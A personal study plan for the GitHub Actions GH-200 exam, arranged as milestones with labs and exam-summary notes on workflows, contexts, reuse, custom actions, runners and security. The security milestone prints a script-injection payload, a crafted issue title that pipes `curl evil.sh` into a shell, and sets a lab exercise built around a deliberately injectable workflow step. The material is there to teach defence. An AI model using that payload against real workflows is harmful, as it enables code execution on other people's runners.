# GH-200 (GitHub Actions) — Study Plan

Based on diagnostic conversation (2026-09-29), 1/16 cold. Milestone-based, no fixed date. Pace: 30-min blocks, however many per day you have. Every milestone pairs a **Theory** block (docs + explain-out-loud, no keyboard) with **Hands-on** blocks (the `jangrothorg/gha` repo) — theory always comes first so you know what you're building before you build it. Recall checks are woven in between so spacing does the work instead of one long cram.

## Starting point (from diagnostic)

- **Solid, don't re-study:** secret precedence (`environment` beats `repository` beats `organization`) — the one question you answered cold.
- **Rusty syntax/mechanics (relearn by doing):** everything else from two years of daily use — contexts, expressions, matrices, the three reuse models, custom action types, runner/secret scoping. The model is intact; the recall has drained.
- **New since you stopped (build from scratch):** the exam's January 2026 rewrite added OIDC cloud federation, immutable actions + SHA pinning, artifact attestations/provenance, granular `GITHUB_TOKEN` permissions, YAML anchors/aliases, service containers, and a dedicated fifth domain (Secure and optimize automation, 10–15%).

## Milestone 0 — Lab & environment setup (1 session) ✅ closed 2026-10-01

- `jangrothorg/gha` is the lab repo — **public**, which is deliberate: org-level secrets aren't reachable from private repos on GitHub Free, so public is what unlocks the enterprise-domain exercises later.
- Enable Actions on it; walk every page under org Settings → Actions once, just to see what's there.
- Self-hosted runner **Kylo** is registered against the org on your own Mac — done. Currently sitting in the **default** runner group, which is fine: moving it into a dedicated group scoped to just `gha` is Milestone 9's actual exercise, no point doing that twice. **Caveat you'll meet again there:** a self-hosted runner on a _public_ repo is exactly the risky configuration the exam warns about — anyone can fork and open a PR that executes on your machine. Fine for a deliberate, supervised exercise; **stop or remove the runner whenever you're not actively using it**, don't leave it listening in the background.
- Walk every page under org Settings → Actions once, just to see what's there (General, Runners, Runner groups) — **done**.
- Open the [GH-200 exam sandbox](https://aka.ms/GHExamDemo-enu) once to see the real question UI — **done**. Format only, no content value, never needs repeating.
- Take the [official practice assessment](https://learn.microsoft.com/en-us/credentials/certifications/github-actions/?practice-assessment-type=certification) cold, no prep (sign in to Microsoft Learn, then "Take the practice assessment" on that page) — a second, externally-scored baseline alongside the 1/16 diagnostic. Record the score and per-domain split; compare against it at the midpoint (Milestone 7) and at the end (Milestone 13).
- **Baseline recorded (2026-10-01):** 83% (25/30) cold, well past the 77% target. This is a different, easier skill than the free-recall diagnostic (recognizing a right answer among options vs. producing one from nothing) — both numbers are real, they're just measuring different things, and recognition is what the real exam actually asks for. All 5 misses were specific and fixable, not conceptual holes: `::error::` workflow-command syntax, `actions/github-script` being entirely unfamiliar, and not recognizing `repository_dispatch`/`workflow_run` as genuine custom-trigger features — folded into Milestones 1 and 2 below. Two Azure-credentials questions just confirmed "use GitHub Secrets, not plaintext" as the floor answer — distinct from OIDC (Milestone 11), which is the more advanced "eliminate the credential entirely" answer to a different question.

## Milestone 1 — Workflow basics + the two output mechanisms (2-3 sessions) ✅ closed 2026-10-02

- **Theory (30-45min):** [Understanding GitHub Actions](https://docs.github.com/en/actions/get-started/understand-github-actions) overview. [Workflow syntax reference](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax), sections on `on:`, `jobs`, `steps`. [Events that trigger workflows](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows), specifically `repository_dispatch` and `workflow_run`. [Variables reference](https://docs.github.com/en/actions/reference/workflows-and-actions/variables) for `GITHUB_ENV` / `GITHUB_OUTPUT`. [`actions/github-script`](https://github.com/actions/github-script) README.
- **Hands-on (45-90min):** Write an `on: push` workflow from scratch in `gha`, no copy-paste — one job, three steps. Add `workflow_dispatch` with a `choice` and a `boolean` input, both with defaults, and run it from the UI. Build a three-step job that sets a value with `GITHUB_ENV` and reads it back, then a separate value via `GITHUB_OUTPUT` read by a later step. Pass that output across a _job_ boundary using `jobs.<id>.outputs` and `needs.<id>.outputs`. Fire a `repository_dispatch` event at `gha` via `gh api` or `curl` with a custom `event_type` and confirm a workflow listening for it runs. Add a step using `actions/github-script` that posts a comment on an issue in `gha` via the authenticated Octokit client.
- **Recall check:** explain `GITHUB_ENV` vs `GITHUB_OUTPUT` out loud, no notes, before moving on. Also: name two trigger types besides `push` and `workflow_dispatch`, and say what `actions/github-script` is for.

**Exam summary:**

- _Both are files, not variables_ — you append `key=value` lines to them; nothing is assigned directly.
- _`GITHUB_ENV`_ sets an environment variable visible to every **subsequent step in the same job**: `$MY_VAR` in a shell, `${{ env.MY_VAR }}` in an expression.
- _`GITHUB_OUTPUT`_ sets a **step output**. The producing step needs an `id`; later steps read `${{ steps.<id>.outputs.<name> }}`.
  ```yaml
  - id: build
    run: echo "version=1.4.2" >> "$GITHUB_OUTPUT"
  - run: echo "${{ steps.build.outputs.version }}"
  ```
- _Crossing a job boundary_ needs a third piece: the producing job declares `jobs.<id>.outputs` mapping to the step output; the consuming job reads `needs.<id>.outputs.<name>`. This is the single most-tested data-flow pattern in domain 1 — worth being able to write cold.
- _`workflow_dispatch` inputs_ are typed (`string`, `boolean`, `choice`, `environment`), can carry a `default` and a `required` flag, and are read via `${{ inputs.<name> }}` — same shape whether triggered from the UI, the CLI (`gh workflow run`), or the REST API.
- _`repository_dispatch` and `workflow_run`_: `repository_dispatch` is a custom, client-defined event (you name the `event_type` yourself) fired via the REST API — the trigger for "an external system should kick off this workflow." `workflow_run` fires when a *different* workflow completes, letting you chain workflows without a direct `needs`/`uses` relationship. Both are genuine first-class Actions triggers — a "which of these is NOT a feature" question that picks "custom event triggers" as the non-feature is wrong, since this is exactly what it is.
- _`actions/github-script`_: a first-party action that gives you an authenticated Octokit client (`github`) inline in a workflow step, for GitHub API calls — comment, label, close — without writing a full custom action. `script:` takes inline JS; `context` carries the triggering event's data.

## Milestone 2 — Contexts, expressions, and where they're legal (2-3 sessions)

- **Theory (30-45min):** [Contexts reference](https://docs.github.com/en/actions/reference/workflows-and-actions/contexts) (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `strategy`, `job`, `steps`) — including its context-availability table, which contexts are legal in which parts of a workflow. [Expressions reference](https://docs.github.com/en/actions/reference/workflows-and-actions/expressions) for syntax, built-in functions, and the status-check functions. [Workflow commands reference](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands) (`::error::`, `::warning::`, `::notice::`, `::group::`, `::add-mask::`) including their optional `key=value` parameters.
- **Hands-on (1-2 sessions):** Dump every context into `GITHUB_STEP_SUMMARY` with `toJSON()` and read what's actually in each one. Drill the functions: `contains`, `startsWith`, `endsWith`, `format`, `join`, `fromJSON`, `hashFiles`, plus the status checks `success()`, `failure()`, `always()`, `cancelled()`. Try to reference `secrets` and `steps` inside a job-level `if:` and watch it fail — then fix the same logic using `vars` or a `needs` output instead. Write a Markdown table of results to `GITHUB_STEP_SUMMARY` with links, and add a status badge to the repo README. Emit `::error::`, `::warning::`, and `::notice::` from a step with and without the optional `file=`, `line=`, `title=` parameters, and look at where each one surfaces (inline annotation on the Files Changed view vs. a plain log line).
- **Recall check:** name one context that is _not_ legal in a job-level `if:`, and say why.

**Exam summary:**

- _Parse time vs runtime_: **parse time** is before any job starts, when the run is created — `on:` filters, `strategy.matrix` expansion, `concurrency`, job-level `if:`. **Runtime** is anything depending on `steps`, on `env` written during the run, or on `runner`.
- _The availability table, the exam-favourite fact_: in `jobs.<id>.if` you may use **`github`, `needs`, `vars` and `inputs`** — and _not_ `env`, `secrets`, `steps` or `matrix`. A common wrong answer is gating a job on a secret's presence; you can't, so you promote it to a `vars` value or an output from an earlier job.
- _Job summaries_: `GITHUB_STEP_SUMMARY` accepts Markdown, rendered on the run's summary page — good for test results, coverage, links. Separate from workflow commands like `::group::` and `::add-mask::`, which format the raw log rather than the summary page.
- _Status-check functions default_: a step/job implicitly runs under `if: success()` unless you override it — this is why a cleanup step needs an explicit `if: always()`.
- _Workflow command syntax, the exact gotcha_: `::error::<message>` — the message is everything after the second `::`, **not** a `message=` parameter. Optional parameters go *before* that, comma-separated with no space: `::error title=Build Failed,file=app.js,line=10::This is an error message`. Same shape for `::warning::` and `::notice::`. `::group::<title>` / `::endgroup::` fold log lines into a collapsible section; `::add-mask::<value>` redacts a value from the log for the rest of the run.

## Milestone 3 — Matrices, job dependencies, service containers (2-3 sessions)

- **Theory (30-45min):** `strategy.matrix` reference including `include`/`exclude`. `needs` context docs. `services:` and `container:` docs. `concurrency` and `timeout-minutes` docs.
- **Hands-on (1-2 sessions):** Build a matrix with two axes, then add `include` and `exclude` and predict the expansion before running it — confirm `include` can add a value combination that doesn't otherwise exist, not just annotate one. Toggle `fail-fast` off and watch the difference against the default. Build a `needs` diamond (two parallel jobs feeding one), gate the last job with `if: always()` and separately with `if: failure()`, and read `needs.X.result` when `X` was a matrix. Stand up a `postgres` service container with `ports`, `env`, and a health-check `options` string; connect from a job running directly on the runner (via `localhost`), then move the job itself into `container:` and watch the addressing change to the service's label as hostname. Set a `concurrency.group` with `cancel-in-progress: true`.
- **Recall check:** what does `fail-fast` default to and what does it actually do? What does `needs.X.result` report when `X` is a 4-way matrix and one variant failed?

**Exam summary:**

- _`fail-fast`_ defaults to `true`: the moment any matrix job fails, GitHub cancels every other in-progress and queued job in that matrix. `false` lets every variant run to completion — what you want to know whether a failure is OS-specific or universal.
- _`max-parallel`_ caps concurrent matrix jobs — a throttle for runner capacity or a rate-limited external service, unrelated to failure handling.
- _`needs.X.result` on a matrix is a single aggregated value_, not one per variant: `failure` if any variant failed, `success` only if all passed. There's no way to branch on one specific variant's result through `needs` — have that variant write an output or artifact instead.
- _`services:`_ starts sidecar containers for the job's duration, Linux runners only. If the job runs **directly on the runner**, map `ports` and connect via `localhost`. If the job itself runs inside `container:`, Docker puts both on a shared network — address the service by its **label** as hostname (`postgres:5432`), no port mapping needed.
- _`concurrency`_ cancels or queues redundant runs sharing a `group` key — the standard fix for "five pushes in two minutes queued five full CI runs."

## Milestone 4 — YAML mechanics & the three reuse models (2-3 sessions)

- **Theory (30-45min):** YAML anchors, aliases, and merge-key syntax (general YAML, not Actions-specific, but the exam asks you to read it). `workflow_call` / reusable workflows docs. Starter workflow docs (`workflow-templates/`, `.properties.json`).
- **Hands-on (1-2 sessions):** Write an anchor/alias/merge example (`&name`, `*name`, `<<:`) reusing a repeated step block inside one workflow file. Then hand-expand an anchored workflow you didn't write — the exam asks you to _read_ these, not just write them. Build a reusable workflow with typed `inputs`, a required `secrets` entry, and an `outputs` block; call it from another workflow with `jobs.<id>.uses`. Build the same call again using `secrets: inherit` and compare what each version actually exposes. Create the org's `.github` repo, add a `workflow-templates/` starter workflow with its `.properties.json`, and create a new workflow from it in `gha`.
- **Recall check:** write the starter/reusable/composite comparison table from memory — where each one's definition lives, how it's invoked, whether updates propagate.

**Exam summary:**

- _Anchors are file-scoped_ — they can't cross files, so they're not an alternative to reusable workflows or composite actions, only to repetition inside one workflow file.
  ```yaml
  x-defaults: &defaults
    shell: bash
    working-directory: ./app
  jobs:
    build:
      steps:
        - <<: *defaults
          run: make build
  ```
- _Starter vs reusable vs composite:_

  |                       | Lives                                                                       | Invoked                                                  | Updates propagate?               |
  | --------------------- | --------------------------------------------------------------------------- | -------------------------------------------------------- | -------------------------------- |
  | **Starter workflow**  | Org's `.github` repo, under `workflow-templates/` with a `.properties.json` | Copied in when someone creates a new workflow            | **No** — independent once copied |
  | **Reusable workflow** | Any repo, `on: workflow_call`                                               | `jobs.<id>.uses: owner/repo/.github/workflows/x.yml@ref` | **Yes** — versioned by ref       |
  | **Composite action**  | `action.yml`, `runs.using: composite`                                       | `steps: - uses:` inside a job                            | **Yes** — versioned by ref       |

Shortest way to hold it: a starter workflow is a _scaffold_, a reusable workflow supplies
whole _jobs_, a composite action supplies _steps_.

- _`secrets: inherit`_ passes **every** secret available to the caller — org, repo, and environment — without naming any of them. Convenient and deliberately broad; the security domain (Milestone 11) prefers explicit mapping precisely because inherit grants access the called workflow never declared a need for.

## Milestone 5 — Custom actions I: building all three types (2 sessions)

- **Theory (30min):** `action.yml` metadata reference — required fields per action type. Creating a composite action. Creating a JavaScript action. Creating a Docker container action.
- **Hands-on (1-2 sessions):** Build a composite action (`runs.using: composite`) wrapping three `run` steps, each needing its own `shell:`; wire an input through and set an output via `GITHUB_OUTPUT` plus `outputs.<x>.value`. Build a JavaScript action (`runs.using: node20`) using `@actions/core` for inputs/outputs, bundle with `ncc`, and commit `dist/`. Build a Docker action (`runs.using: docker`) with a Dockerfile, `args`, and `env`. Break each one on purpose — remove a `shell:`, misname an input, ship an unbundled JS action — and read the failure until it's recognisable at a glance.
- **Recall check:** name the three action types, the metadata filename, and the `runs.using` value for each.

**Exam summary:**

- _Metadata file_: `action.yml` (or `action.yaml`), at the root of the action's directory — the repo root for a Marketplace-published action.
- _JavaScript action_:
  ```yaml
  runs:
    using: node20
    main: dist/index.js
    post: dist/cleanup.js
  ```

`pre`/`post` are optional hooks around the job's other steps. **The runner never runs
`npm install`** — it checks out the action and executes `main` directly, so every dependency
must already be in the repo: either committed `node_modules` or, far better, bundled into
one file with `@vercel/ncc` with `dist/` committed. An unbundled action fails at runtime with
a module-not-found error — the single most common custom-action bug.

- _Composite action_: every `run:` step needs its own `shell:` (it isn't inherited from the caller); inputs come through as `${{ inputs.x }}`.
- _Docker action_: Linux-only, slower to start (image build/pull on every cold run), but gives full control of the execution environment.

## Milestone 6 — Custom actions II: versioning, distribution, debugging (1-2 sessions)

- **Theory (30min):** Versioning actions docs (semver + the moving major tag convention). Immutable actions docs. Publishing to the GitHub Marketplace docs. Debug logging docs.
- **Hands-on (30-60min):** Publish `v1.0.0`, then move a `v1` tag onto it; build the small release workflow that does the retag automatically. Pin a reference to the full 40-character commit SHA instead and compare. Walk the Marketplace publish flow without finishing it (public repo, `action.yml` at root, unique name, a tagged release). Set `ACTIONS_STEP_DEBUG`/`ACTIONS_RUNNER_DEBUG` as secrets and re-run a failed job with debug logging on.
- **Recall check:** explain the tension between the moving-tag convenience and the SHA-pin security answer — and what immutable actions do to close that gap.

**Exam summary:**

- _The moving tag_: publish `v1.2.3`, then move `v1` to point at the same commit. Consumers on `@v1` pick up non-breaking updates automatically; you only break them at `v2`.
- _The tension_: a moving tag is mutable by definition — if the action is compromised, the code under `@v1` changes beneath every consumer with no diff to review. So the security-flavoured preferred answer is always **pin to the full commit SHA**, with Dependabot raising PRs to bump the pins:
  ```yaml
  uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.1
  ```
- _Immutable actions_ close the gap from the other side: a released version is published as a package whose contents can no longer change, so a version reference becomes as trustworthy as a SHA. Know both answers — the exam tests whether you know _why_ SHA-pinning exists, not just that it does.
- _Distribution models_: public repo, private repo inside the org, same-repo `./path` reference, Marketplace — pick based on who needs to consume it and whether it should be discoverable.

## Milestone 7 — Midpoint self-test and repair (1 session)

Half-time. No new theory — this is a checkpoint.

- Build a full CI workflow from a blank file, no docs, no autocomplete: matrix across three OS, a dependent job, cached dependencies, a value passed between jobs, a job summary. Time yourself.
- Build the reuse trio from memory: a reusable workflow with typed inputs and a secret, a composite action wrapping three steps with an output, a starter workflow template with its `.properties.json`.
- Mark your own work against the docs — be harsh, a workflow that wouldn't run is a fail, not a near miss.
- Take the official practice assessment a second time; compare the per-domain split against the Milestone 0 baseline.
- Repair whichever milestone the last two exercises exposed as weakest, hands-on, before moving on to Milestone 8.

## Milestone 8 — Enterprise I: policies & governance (2 sessions)

- **Theory (30-45min):** Org-level Actions policies docs. Fork pull request approval docs. Default `GITHUB_TOKEN` permissions docs. Secrets/variables scoping docs (org, repo, environment). Managing secrets via the REST API docs.
- **Hands-on (1-2 sessions):** Set the org's Actions policy to "Allow select actions," add a verified-creator toggle and an explicit `owner/*` pattern. Open a PR from a fork against `gha` (a second account or a throwaway fork) and observe the approval requirement. Set the default `GITHUB_TOKEN` permission to read-only at repo level, watch which existing workflow breaks, and fix it with an explicit `permissions:` block. Create a secret with the same name at org, repo, and environment level in `gha` and prove the precedence you already know. Create and list a secret via the REST API, including the libsodium public-key encryption step.
- **Recall check:** name the four Actions policy settings, from most to least permissive.

**Exam summary:**

- _Org Actions policy, escalating choices_: disable Actions entirely → allow all actions and reusable workflows → allow only actions/workflows from within the enterprise or organization → **allow select actions**, which exposes three independent toggles: actions created by GitHub, Marketplace verified-creator actions, and a free-text allow-list of patterns (`owner/*`, `owner/repo@ref`).
- _Fork PRs_: anyone can fork a public repo and open a PR proposing workflow changes, so workflows triggered by fork PRs don't get secrets and may require approval depending on the contributor-approval policy. `pull_request_target` combined with checking out the PR head is the dangerous pattern — it runs with the base repo's full permissions and secrets against attacker-controlled code.
- _`GITHUB_TOKEN`_: default permission scope is configurable at org and repo level (read-only vs read/write); a workflow can further narrow with its own `permissions:` block, never widen past the default.
- _Secret precedence, confirmed hands-on_: `environment > repository > organization` — most specific wins, others simply aren't visible to that job.

## Milestone 9 — Enterprise II: runners at scale (2 sessions)

- **Theory (30-45min):** GitHub-hosted runner images and the toolcache docs (runner-images repo). Runner image migration notes — Ubuntu 20.04 removal, `windows-latest` moving to Windows Server 2025. Self-hosted runner install/label/group docs. Self-hosted runner security docs. `setup-*` actions docs.
- **Hands-on (1-2 sessions):** Find the preinstalled tool list and toolcache contents for `ubuntu-latest` in the runner-images repo. Add a label to the runner from Milestone 0, set its group's access policy to scope it to `gha` only, and try `--ephemeral`. Install an extra tool at runtime with a `setup-*` action and compare against relying on the toolcache.
- **Recall check:** say out loud why this exact lab setup — self-hosted runner on a public repo — is the configuration the exam's own security guidance warns against, and what you did about it (labelled, scoped to one repo via its group, stopped when not in active use).

**Exam summary:**

- _Runner groups_ collect runners and control which organizations, repositories, and workflows may use them — the access boundary for runner fleets. Free, Team, and enterprise-owned orgs can all create additional groups for self-hosted runners.
- _The public-repo caveat, for real this time_: never leave a self-hosted runner attached to a public repository unattended. A fork PR can execute arbitrary code on it, and self-hosted runners persist state between jobs by default, so a compromise isn't confined to one run. Ephemeral runners in disposable environments are the safer pattern if you need this for real.
- _Toolcache_: GitHub-hosted runner images ship a large preinstalled set (languages, SDKs, package managers), documented per-image in the runner-images repo's release notes — faster than installing at runtime, but versions lag; `setup-*` actions (`setup-node`, `setup-python`, …) pin exact versions when the toolcache's default isn't precise enough.
- _Image migrations_ are a real exam topic because they break pinned workflows: Ubuntu 20.04 was removed from hosted runners, and `windows-latest` has moved generations (most recently to Windows Server 2025) — pin an exact image label (`ubuntu-22.04` rather than `ubuntu-latest`) when you need stability across a migration window.

## Milestone 10 — Enterprise III: the REST API and diagnosing failures (1-2 sessions)

- **Theory (30min):** Workflow runs REST API docs (list, re-run, re-run-failed-jobs, cancel, download logs/artifacts). Artifact and log retention docs, both UI and API. Artifacts v4 behaviour notes.
- **Hands-on (1 session):** Set artifact/log retention in repo settings, then set it again via the REST API and confirm they agree. Do each of list/re-run/re-run-failed/cancel/download with `gh api` or `curl` against `gha`. Write three workflows that each fail for a different reason, leave them a day, then debug each from the run log alone — no looking at the YAML first. Correlate a matrix job's name back to its axis values from the run list, and re-run only one failed variant without re-running the rest.
- **Recall check:** from memory, what's the API call (or `gh` equivalent) to re-run only the failed jobs in a run?

**Exam summary:**

- _Retention_ can be set at org or repo level in the UI, and the same setting is reachable through the REST API — the study guide calls the API path out explicitly, so expect a question phrased around automating it rather than clicking it.
- _Re-running failed jobs only_ re-executes just the jobs that didn't succeed, keeping successful jobs' results — distinct from re-running the whole workflow, which repeats everything including jobs that already passed.
- _Matrix troubleshooting_: each matrix job's display name embeds its axis values (`build (ubuntu-latest, 18)`), which is how you correlate a failure back to a specific combination without reading the matrix definition again; re-running one variant targets that specific job, not the whole matrix.
- _Artifacts v4_ changed some prior behaviour (artifacts from different jobs no longer merge into one by default, and immutability means an artifact can't be appended to after upload) — know this is a _version_ fact, not a universal one, if a question's wording suggests an older behaviour.

## Milestone 11 — Security: the new fifth domain (2-3 sessions)

- **Theory (45min-1hr):** `GITHUB_TOKEN` lifecycle docs. Security hardening for GitHub Actions guide (script injection section specifically). OIDC / cloud provider federation docs. Artifact attestations / build provenance docs.
- **Hands-on (1-2 sessions):** Put `run: echo "${{ github.event.issue.title }}"` into a workflow in `gha` and break it with a crafted issue title; fix it three ways (environment-variable indirection being the primary one). Set `permissions: id-token: write` and walk through what the `sub` claim would look like for this repo on a push to `main` vs. inside an `environment:`. Run `actions/attest-build-provenance` on a build artifact and verify it with `gh attestation verify`.
- **Recall check:** why is interpolating untrusted input directly into `run:` dangerous, and what's the fix? What permission does OIDC federation need, and what does it let you delete?

**Exam summary:**

- _`GITHUB_TOKEN`_ is ephemeral and job-scoped — minted fresh per job, expires when the job ends. `permissions:` at workflow or job level narrows its scope; contrast with classic PATs, fine-grained PATs, and GitHub App tokens, which are the right answer when a workflow needs access _outside_ the triggering repo.
- _Script injection_: `${{ }}` is interpolated into the script **as text, before the shell ever runs**. A crafted title like `"; curl evil.sh | sh #` executes on the runner with the job's token and whatever else is in scope. The fix is indirection through the environment, which the shell receives as data, never as code:
  ```yaml
  - env:
      TITLE: ${{ github.event.issue.title }}
    run: echo "$TITLE"
  ```

Supporting controls: least-privilege `permissions:`, preferring vetted actions over inline
shell, never combining `pull_request_target` with a checkout of the PR head.

- _OIDC federation_: the job requests `permissions: id-token: write` (plus `contents: read`); the runner asks GitHub's OIDC provider for a short-lived JWT; the cloud side validates the issuer and the `sub` claim (`repo:org/name:ref:refs/heads/main` or `repo:org/name:environment:production`) against a trust policy and returns short-lived cloud credentials. **What it deletes**: long-lived cloud secrets stored in GitHub entirely — nothing to rotate, nothing to leak, and the trust policy scopes access to a specific repo, branch, or environment in a way a static key never could.
- _Attestations/provenance_: `actions/attest-build-provenance` records what built an artifact and how (SLSA-style provenance); `gh attestation verify` checks it before deployment — the mechanism a deployment gate uses to refuse an artifact that didn't come from the expected build.

## Milestone 12 — Optimization: caching, environments, cost (1-2 sessions)

- **Theory (30min):** `actions/cache` docs (`key`, `restore-keys`, `path`, scoping/eviction). Environments and deployment protection rules docs. Workflow triggers' path/branch filter docs.
- **Hands-on (1 session):** Build a cache with an exact `key` and a `restore-keys` prefix fallback; trigger a partial-match restore and observe the `cache-hit` output in both cases. Create an environment on `gha` with a required reviewer and a wait timer, add an environment-scoped secret, and watch a job pause for approval. Add `paths`/`paths-ignore` filters to a trigger and confirm a doc-only change no longer fires the workflow.
- **Recall check:** when is `actions/cache` the right tool vs. an artifact, and what does `restore-keys` actually do on a cache miss?

**Exam summary:**

- _Cache key matching_: an exact `key` match restores that cache precisely; on a miss, `restore-keys` tries each prefix in order and restores the most recent partial match (e.g. a lockfile-hash key falling back to a branch-name prefix) — useful for warm-but-not-identical dependency caches. Caches are also branch-scoped for restore purposes and evicted on an LRU-ish basis under the account's total size cap.
- _Cache vs. artifact_: cache is for speeding up future runs with the same inputs (dependencies, build outputs keyed by a hash); artifacts are for carrying a _specific run's_ output to a later job or for human download, with their own retention policy and v4 immutability.
- _Environments_: required reviewers and wait timers gate a job at the point it requests that `environment:`, and environment secrets are only readable by a job that declares it — the standard answer whenever a question pairs "production credentials" with "needs approval."
- _Cost levers_: path/branch filters and `concurrency` to kill redundant runs, trimming matrix size, and runner size choice all trade off against each other — a bigger runner that finishes faster isn't automatically cheaper once the per-minute multiplier is accounted for.

## Milestone 13 — Final review (1 session)

- Flashcard-style sweep: re-read every Exam summary block above, end to end, no new material.
- Self-rate the full Skills Measured list green/amber/red; spend any remaining time only on reds.
- Take the official practice assessment a third time; compare the trend across Milestones 0, 7, and 13 — the trend matters more than the final number.
- Exam-day logistics: proctored online — confirm system requirements, photo ID, and a quiet room in advance, not day-of. Re-open the exam sandbox once more so the interface is familiar.

**Domain → where it's covered in this doc** (use for this final pass; exam is 60 scored questions, 100 minutes, 700/1000 to pass, 2-year validity):

| #   | Exam domain                              | Weight | Covered in                                           |
| --- | ---------------------------------------- | ------ | ---------------------------------------------------- |
| 1   | Author and manage workflows              | 20-25% | M1, M2, M3, M4 (anchors), M12 (environments/filters) |
| 2   | Consume and troubleshoot workflows       | 15-20% | M4 (reuse trio), M10                                 |
| 3   | Author and maintain actions              | 15-20% | M5, M6                                               |
| 4   | Manage GitHub Actions for the enterprise | 20-25% | M8, M9, M10 (API)                                    |
| 5   | Secure and optimize automation           | 10-15% | M11, M12 (caching/cost)                              |

**New since you last used Actions — the likeliest surprises:** OIDC cloud federation (M11), immutable actions + SHA pinning (M6), artifact attestations (M11), YAML anchors/aliases (M4), service containers (M3), granular `GITHUB_TOKEN` permissions (M8, M11), runner image migrations (M9).

--- **Exit criteria per milestone:** can explain the theory out loud without notes AND can perform the hands-on task from memory. If either fails, that milestone isn't done — loop back before moving on.
